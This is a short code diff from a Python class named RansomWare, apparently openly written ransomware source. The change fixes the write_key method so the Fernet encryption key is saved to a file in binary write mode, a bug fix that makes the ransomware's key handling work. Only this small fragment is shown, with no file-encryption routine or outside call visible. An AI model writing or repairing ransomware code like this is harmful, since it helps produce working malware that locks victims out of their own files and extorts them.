@@ -57,7 +57,7 @@ class RansomWare:
         self.crypter = Fernet(self.key)
 
     def write_key(self):
-        with open(self.key_path) as f:
+        with open(self.key_path,'wb') as f:
             f.write(self.key)
             return 1
 
